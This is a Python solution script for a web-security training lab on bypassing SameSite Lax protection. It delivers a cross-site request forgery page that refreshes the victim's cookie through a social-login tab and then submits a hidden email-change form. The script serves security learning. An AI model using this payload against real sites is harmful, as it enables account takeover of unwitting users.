##################################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 24/10/2023
#
# Lab: SameSite Lax bypass via cookie refresh
#
# Steps: 1. Craft an HTML form for changing the email address with a script that opens
#           a new tab to force the victim to refresh their cookie and submit the form 
#           after a few seconds to make sure that the redirection occurred
#        2. Deliver the exploit to the victim
#        3. The victim's email will be changed after they trigger the exploit
#
##################################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
lab_url = "https://0ac0006b04408c7383bd598d00f800dd.web-security-academy.net"

# change this to your exploit server URL
exploit_server_url = "https://exploit-0a03000704a18c3f831658d1014d0036.exploit-server.net"

# the header of your exploit sever response
exploit_server_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    
# the new email
# you can change this to what you want
new_email = "hacked@you.com"

# payload to change the victim's email
payload = f"""<html>
                <body>
                <form action="{lab_url}/my-account/change-email" method="POST">
                    <input type="hidden" name="email" value="{new_email}" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                    window.onclick = () => {{ 
                        window.open("{lab_url}/social-login");
                        setTimeout(() => {{
                            document.forms[0].submit();
                        }}, 3000);
                    }}
                </script>
                </body>
            </html>"""

# data to send via POST
data = {
    "formAction": "DELIVER_TO_VICTIM",
    "urlIsHttps": "on",
    "responseFile": "/exploit",
    "responseHead": exploit_server_head,
    "responseBody": payload,
}

try:
    # deliver the exploit to the victim
    res = requests.post(exploit_server_url, data)

except:
    print(Fore.RED + "[!] Failed to deliver the exploit to the victim through exception")
    exit(1)

print(Fore.WHITE + "❯❯ Delivering the exploit to the victim.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 The victim's email will be changed after they trigger the exploit") 
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")



